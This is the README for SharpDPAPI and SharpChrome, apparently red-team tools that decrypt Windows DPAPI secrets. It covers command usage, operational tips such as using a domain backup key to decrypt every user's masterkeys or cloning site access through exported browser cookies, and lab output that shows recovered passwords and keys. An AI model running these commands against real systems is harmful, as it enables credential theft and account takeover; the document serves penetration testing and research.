# SharpDPAPI

----

[SharpDPAPI](#sharpdpapi-1) is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.

**I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process and operationalize it to fit our workflow.**

The [SharpChrome](#sharpchrome) subproject is an adaptation of work from [@gentilkiwi](https://twitter.com/gentilkiwi) and [@djhohnstein](https://twitter.com/djhohnstein), specifically his [SharpChrome project](https://github.com/djhohnstein/SharpChrome/). However, this version of SharpChrome uses a different version of the [C# SQL library](https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp) that supports [lockless opening](https://github.com/gentilkiwi/mimikatz/pull/199). SharpChrome is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Both Chrome and newer Chromium-based Edge browsers can be triaged with SharpChrome.

SharpChrome also uses an minimized version of @AArnott's [BCrypt P/Invoke code](https://github.com/AArnott/pinvoke/tree/master/src/BCrypt) released under the MIT License.

If you're unfamiliar with DPAPI, [check out this post](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) for more background information. For more information on Credentials and Vaults in regards to DPAPI, check out Benjamin's [wiki entry on the subject.](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SharpDPAPI is licensed under the BSD 3-Clause license.


## Table of Contents

- [SharpDPAPI](#sharpdpapi)
  - [Table of Contents](#table-of-contents)
  - [Background](#background)
      - [SharpDPAPI Command Line Usage](#sharpdpapi-command-line-usage)
      - [SharpChrome Command Line Usage](#sharpchrome-command-line-usage)
    - [Operational Usage](#operational-usage)
      - [SharpDPAPI](#sharpdpapi-1)
      - [SharpChrome](#sharpchrome)
  - [SharpDPAPI Commands](#sharpdpapi-commands)
    - [User Triage](#user-triage)
      - [masterkeys](#masterkeys)
      - [credentials](#credentials)
      - [vaults](#vaults)
      - [rdg](#rdg)
      - [keepass](#keepass)
      - [certificates](#certificates)
      - [triage](#triage)
    - [Machine Triage](#machine-triage)
      - [machinemasterkeys](#machinemasterkeys)
      - [machinecredentials](#machinecredentials)
      - [machinevaults](#machinevaults)
      - [certificates /machine](#certificates-machine)
      - [machinetriage](#machinetriage)
    - [Misc](#misc)
      - [ps](#ps)
      - [blob](#blob)
      - [backupkey](#backupkey)
      - [search](#search)
      - [sccm](#sccm)
  - [SharpChrome Commands](#sharpchrome-commands)
    - [logins](#logins)
    - [cookies](#cookies)
    - [statekeys](#statekeys)
    - [backupkey](#backupkey-1)
  - [Compile Instructions](#compile-instructions)
    - [Targeting other .NET versions](#targeting-other-net-versions)
    - [Sidenote: Running SharpDPAPI Through PowerShell](#sidenote-running-sharpdpapi-through-powershell)
      - [Sidenote Sidenote: Running SharpDPAPI Over PSRemoting](#sidenote-sidenote-running-sharpdpapi-over-psremoting)


## Background

#### SharpDPAPI Command Line Usage


      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.11.3



    Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

      SharpDPAPI backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]


    The *search* comand will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs:

        search /type:registry [/path:HKLM\path\to\key] [/showErrors]
        search /type:folder /path:C:\path\to\folder [/maxBytes:<numOfBytes>] [/showErrors]
        search /type:file /path:C:\path\to\file [/maxBytes:<numOfBytes>]
        search /type:base64 [/base:<base64 string>]


    Machine/SYSTEM Triage:

        machinemasterkeys       -   triage all reachable machine masterkey files (elevates to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret)
        machinecredentials      -   use 'machinemasterkeys' and then triage machine Credential files
        machinevaults           -   use 'machinemasterkeys' and then triage machine Vaults
        machinetriage           -   run the 'machinecredentials' and 'machinevaults' commands


    User Triage:

        Arguments for the 'masterkeys' command:

            /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
            /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
            /pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
            /password:X             -   first decrypt the current user's masterkeys using a plaintext password or NTLM hash (works remotely)
            /server:SERVER          -   triage a remote server, assuming admin access


        Arguments for the credentials|vaults|rdg|keepass|triage|blob|ps commands:

            Decryption:
                /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
                /password:X         -   first decrypt the current user's masterkeys using a plaintext password or NTLM hash. Works with any function, as well as remotely.
                GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
                /mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption
                /pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
                /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys

            Targeting:
                /target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
                /server:SERVER      -   triage a remote server, assuming admin access
                                        Note: must use with /pvk:KEY or /password:X
                                        Note: not applicable to 'blob' or 'ps' commands


    Certificate Triage:

        Arguments for the 'certificates' command:
            /showall                                        -   show all decrypted private key files, not just ones that are linked to installed certs (the default)
            /machine                                        -   use the local machine store for certificate triage
            /mkfile | /target                               -   for /machine triage
            /unprotect                                      -   force use of CryptUnprotectData() for user triage
            /pvk | /mkfile | /password | /server | /target  -   for user triage


    Note: in most cases, just use *triage* if you're targeting user DPAPI secrets and *machinetriage* if you're going after SYSTEM DPAPI secrets.
          These functions wrap all the other applicable functions that can be automatically run.



#### SharpChrome Command Line Usage

      __                 _
     (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
     __) | | (_| |  |_) \_ | | | (_) | | | (/_
                    |
      v1.9.0


    Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

      SharpChrome backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]


    Global arguments for the 'cookies', 'logins', and 'statekeys' commands:

        Decryption:
            /unprotect          -   force use of CryptUnprotectData() (default for unprivileged execution)
            /password:X         -   first decrypt the current user's masterkeys using a plaintext password. Works with any function, as well as remotely.
            GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
            /mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption
            /pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
            /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
            /statekey:X         -   a decrypted AES state key (from the 'statekeys' command)

        Targeting:
            /target:FILE        -   triage a specific 'Cookies', 'Login Data', or 'Local State' file location
            /target:C:\Users\X\ -   triage a specific user folder for any specified command
            /server:SERVER      -   triage a remote server, assuming admin access (note: must use with /pvk:KEY)
            /browser:X          -   triage 'chrome' (default), (chromium-based) 'edge', or 'slack'

        Output:
            /format:X           -   either 'csv' (default) or 'table' display
            /showall            -   show Login Data entries with null passwords and expired Cookies instead of filtering (default)
            /consoleoutfile:X   -   output all console output to a file on disk


    'cookies' command specific arguments:

            /cookie:"REGEX"     -   only return cookies where the cookie name matches the supplied regex
            /url:"REGEX"        -   only return cookies where the cookie URL matches the supplied regex
            /format:json        -   output cookie values in an EditThisCookie JSON import format. Best when used with a regex!
            /setneverexpire     -   set expirations for cookies output to now + 100 years (for json output)


### Operational Usage

#### SharpDPAPI

One of the goals with SharpDPAPI is to operationalize Benjamin's DPAPI work in a way that fits with our workflow.

How exactly you use the toolset will depend on what phase of an engagement you're in. In general this breaks into "have I compromised the domain or not".

If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the [backupkey](#backupkey) command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the [backupkey](#backupkey) command can be used with the [masterkeys](#masterkeys), [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), or [triage](#triage) commands.

If DA privileges have not been achieved, using Mimikatz' `sekurlsa::dpapi` command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running `dpapi::cache` after key extraction will give you a nice table). If you change these keys to a `{GUID1}:SHA1 {GUID2}:SHA1...` type format, they can be supplied to the [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), or [triage](#triage) commands. This lets you triage all Credential files/Vaults on a system for any user who's currently logged in, without having to do file-by-file decrypts.

For decrypting RDG/RDCMan.settings files with the [rdg](#rdg) command, the `/unprotect` flag will use CryptUnprotectData() to decrypt any saved RDP passwords, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

For machine-specific DPAPI triage, the `machinemasterkeys|machinecredentials|machinevaults|machinetriage` commands will do the machine equivalent of user DPAPI triage. If in an elevated context (that is, you need local administrative rights), SharpDPAPI will elevate to SYSTEM privileges to retrieve the "DPAPI_SYSTEM" LSA secret, which is then used to decrypt any discovered machine DPAPI masterkeys. These keys are then used as lookup tables for machine credentials/vaults/etc.

For more offensive DPAPI information, [check here](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/).

#### SharpChrome

SharpChrome is a Chrome-specific implementation of SharpDPAPI capable of **cookies** and **logins** decryption/triage. It is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Since Chrome Cookies/Login Data are saved without CRYPTPROTECT_SYSTEM, CryptUnprotectData() is back on the table. If SharpChrome is run from an unelevated contect, it will attempt to decrypt any logins/cookies for the current user using CryptUnprotectData(). A `/pvk:[BASE64|file.pvk]`, {GUID}:SHA1 lookup table, `/password:X`, or `/mkfile:FILE` of {GUID}:SHA1 values can also be used to decrypt values. Also, the [C# SQL library](https://github.com/akveo/digitsquare/tree/a251a1220ef6212d1bed8c720368435ee1bfdfc2/plugins/com.brodysoft.sqlitePlugin/src/wp) used (with a few modifications) supports [lockless opening](https://github.com/gentilkiwi/mimikatz/pull/199), meaning that Chrome does not have to be closed/target files do not have to be copied to another location.

If Chrome is version 80+, an AES state key is stored in *AppData\Local\Google\Chrome\User Data\Local State* - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when `/browser:edge` or `/browser:brave` is specified, for newer Chromium-based Edge browser triage.

By default, cookies and logins are displayed as a csv - this can be changed with `/format:table` for table output, and `/format:json` for cookies specifically. The json option outputs cookies in a json format that can be imported into the [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) Chrome extension for easy reuse.

The **cookies** command also has `/cookie:REGEX` and `/url:REGEX` arguments to only return cookie names or urls matching the supplied regex. This is useful with `/format:json` to easily clone access to specific sites.

Specific cookies/logins/statekey files can be specified with `/target:X`, and a user folder can be specified with `/target:C:\Users\USER\` for any triage command.


## SharpDPAPI Commands

### User Triage

#### masterkeys

The **masterkeys** command will search for any readable user masterkey files and decrypt them using a supplied domain DPAPI backup key. It will return a set of masterkey {GUID}:SHA1 mappings.

`/password:X` can be used to decrypt a user's current masterkeys. Note that for domain-joined machines, the password can be supplied in either plaintext or NTLM format. If `/target` is also supplied with `/password`, the `/sid:X` full domain SID of the user also needs to be specified.

The domain backup key can be in base64 form (`/pvk:BASE64...`) or file form (`/pvk:key.pvk`).

    C:\Temp>SharpDPAPI.exe masterkeys /pvk:key.pvk

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Triage User Masterkey Files

    [*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
    [*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
    ...(snip)...

    [*] User master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316...(snip)...
    ...(snip)...


If no `/pasword` or `/pvk` is specified, you may pass the `/hashes` flag to dump the master key hashes in John/Hashcat format. In this mode, the hashes are printed in the format of `{GUID}:DPAPImk`.

The `Preferred` key is also parsed in order to highlight the current preferred master key, so that effort is not spent cracking older keys.

    C:\Temp>SharpDPAPI.exe masterkeys /hashes

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.11.3
    
    
    [*] Action: User DPAPI Masterkey File Triage
    
    [*] Will dump user masterkey hashes
    
    [*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
    [*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
    ...(snip)...

    [*] Preferred master keys:
    
    C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
    C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a


    [*] User master key hashes:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:$DPAPImk$1*3*S-1-5-21-1473254003-2681465353-4059813368-1000*des3*sha1*18000*09c49e9af9...(snip)...


#### credentials

The **credentials** command will search for Credential files and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

A specific credential file (or folder of credentials) can be specified with `/target:FILE` or `/target:C:\Folder\`. If a file is specified, {GUID}:SHA1 values are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

If run from an elevated context, Credential files for ALL users will be triaged, otherwise only Credential files for the current user will be processed.

Using domain {GUID}:SHA1 masterkey mappings:

    C:\Temp>SharpDPAPI.exe credentials {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: User DPAPI Credential Triage

    [*] Triaging Credentials for ALL users


    Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

      CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

        guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
        size             : 436
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      : Local Credential Data

        LastWritten      : 1/22/2019 2:44:40 AM
        TargetName       : Domain:target=TERMSRV/10.4.10.101
        TargetAlias      :
        Comment          :
        UserName         : DOMAIN\user
        Credential       : Password!

      ...(snip)...


Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
 
    C:\Temp>SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: User DPAPI Credential Triage

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
    ...(snip)...

    [*] Triaging Credentials for ALL users


    Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

      CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

        guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
        size             : 436
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      : Local Credential Data

        LastWritten      : 1/22/2019 2:44:40 AM
        TargetName       : Domain:target=TERMSRV/10.4.10.101
        TargetAlias      :
        Comment          :
        UserName         : DOMAIN\user
        Credential       : Password!

    ...(snip)...



#### vaults

The **vaults** command will search for Vaults and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The Policy.vpol folder in the Vault folder is decrypted with any supplied DPAPI keys to retrieve the associated AES decryption keys, which are then used to decrypt any associated .vcrd files.

A specific vault folder can be specified with `/target:C:\Folder\`. In this case, either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

Using domain {GUID}:SHA1 masterkey mappings:

    C:\Temp>SharpDPAPI.exe vaults {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...
      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: User DPAPI Vault Triage

    [*] Triaging Vaults for ALL users


    [*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
        size             : 240
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      :
        aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
        aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

        LastWritten      : 10/12/2018 12:10:42 PM
        FriendlyName     : Internet Explorer
        Identity         : admin
        Resource         : https://10.0.0.1/
        Authenticator    : Password!

    ...(snip)...


Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

    C:\Temp>SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...
      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: DPAPI Vault Triage

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
    ...(snip)...

    [*] Triaging Vaults for ALL users


    [*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
        size             : 240
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      :
        aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
        aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

        LastWritten      : 10/12/2018 12:10:42 PM
        FriendlyName     : Internet Explorer
        Identity         : admin
        Resource         : https://10.0.0.1/
        Authenticator    : Password!

    ...(snip)...


Using a domain DPAPI backup key with a folder specified (i.e. "offline" triage):

    C:\Temp>SharpDPAPI.exe vaults /target:C:\Temp\test\ /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: User DPAPI Vault Triage

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
    ...(snip)...

    [*] Target Vault Folder: C:\Temp\test\


    [*] Triaging Vault folder: C:\Temp\test\

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
        size             : 240
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32772/26115
        description      :
        aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
        aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

        LastWritten      : 3/20/2019 6:03:50 AM
        FriendlyName     : Internet Explorer
        Identity         : account
        Resource         : http://www.abc.com/
        Authenticator    : password


#### rdg

The **rdg** command will search for RDCMan.settings files for the current user (or if elevated, all users) and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The `/unprotect` flag will use CryptUnprotectData() to decrypt any saved RDP passwords, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

A specific RDCMan.settings file, .RDC file (or folder of .RDG files) can be specified with `/target:FILE` or `/target:C:\Folder\`. If a file is specified, {GUID}:SHA1 values (or `/unprotect`) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

This command will decrypt any saved password information from both the RDCMan.settings file and any .RDG files referenced by the RDCMan.settings file.

Using `/unprotect` to decrypt any found passwords:

    C:\Temp>SharpDPAPI.exe rdg /unprotect

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.3.0


    [*] Action: RDG Triage

    [*] Using CryptUnprotectData() to decrypt RDG passwords

    [*] Triaging RDCMan Settings Files for current user

        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
        Accessed      : 5/9/2019 11:52:58 AM
        Modified      : 5/9/2019 11:52:58 AM
        Recent Server : test\primary.testlab.local

            Cred Profiles

              Profile Name : testprofile
                UserName   : testlab.local\dfm
                Password   : Password123!

            Default Logon Credentials

              Profile Name : Custom
                UserName   : TESTLAB\harmj0y
                Password   : Password123!

          C:\Users\harmj0y\Documents\test.rdg

            Servers

              Name         : secondary.testlab.local

              Name         : primary.testlab.local
              Profile Name : Custom
                UserName   : TESTLAB\dfm.a
                Password   : Password123!


Using domain {GUID}:SHA1 masterkey mappings:

    C:\Temp>SharpDPAPI.exe rdg {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.3.0


    [*] Action: RDG Triage

    [*] Using CryptUnprotectData() to decrypt RDG passwords

    [*] Triaging RDCMan Settings Files for current user

        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
        Accessed      : 5/9/2019 11:52:58 AM
        Modified      : 5/9/2019 11:52:58 AM
        Recent Server : test\primary.testlab.local

            Cred Profiles

              Profile Name : testprofile
                UserName   : testlab.local\dfm
                Password   : Password123!

            Default Logon Credentials

              Profile Name : Custom
                UserName   : TESTLAB\harmj0y
                Password   : Password123!

          C:\Users\harmj0y\Documents\test.rdg

            Servers

              Name         : secondary.testlab.local

              Name         : primary.testlab.local
              Profile Name : Custom
                UserName   : TESTLAB\dfm.a
                Password   : Password123!


Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

    C:\Temp>SharpDPAPI.exe rdg /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.3.0


    [*] Action: RDG Triage

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
    ...(snip)...

    [*] Triaging RDCMan.settings Files for ALL users

        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
        Accessed      : 5/9/2019 11:52:58 AM
        Modified      : 5/9/2019 11:52:58 AM
        Recent Server : test\primary.testlab.local

            Cred Profiles

              Profile Name : testprofile
                UserName   : testlab.local\dfm.a
                Password   : Password123!

            Default Logon Credentials

              Profile Name : Custom
                UserName   : TESTLAB\harmj0y
                Password   : Password123!

          C:\Users\harmj0y\Documents\test.rdg

            Servers

              Name         : secondary.testlab.local

              Name         : primary.testlab.local
              Profile Name : Custom
                UserName   : TESTLAB\dfm.a
                Password   : Password123!


#### keepass

The **keepass** command will search for KeePass ProtectedUserKey.bin files for the current user (or if elevated, all users) and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The `/unprotect` flag will use CryptUnprotectData() to decrypt the key bytes, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

A specific ProtectedUserKey.bin file, .RDC file (or folder of .RDG files) can be specified with `/target:FILE` or `/target:C:\Folder\`. If a file is specified, {GUID}:SHA1 values (or `/unprotect`) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

Decrypted key file bytes can be used with the [modified KeePass version in KeeThief](https://github.com/GhostPack/KeeThief/tree/master/KeePass-2.34-Source-Patched).

Using `/unprotect` to decrypt any found key material:

    C:\Temp> SharpDPAPI.exe  keepass /unprotect

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.10.0


    [*] Action: KeePass Triage

    [*] Using CryptUnprotectData() for decryption.

    [*] Triaging KeePass ProtectedUserKey.bin files for current user

        File             : C:\Users\harmj0y\AppData\Roaming\KeePass\ProtectedUserKey.bin
        Accessed         : 3/1/2021 1:38:22 PM
        Modified         : 1/4/2021 5:49:49 PM
        guidMasterKey    : {dab90445-0a08-4b27-9110-b75d4a7894d0}
        size             : 210
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        Key Bytes        : 39 2E 63 EF 0E 37 E8 5C 34 ...


    SharpDPAPI completed in 00:00:00.0566660


#### certificates

The **certificates** command will search user encrypted DPAPI certificate private keys a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The `/unprotect` flag will use CryptUnprotectData() to decrypt private keys, *if* the command is run from the user context whose certificates you are trying to access. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

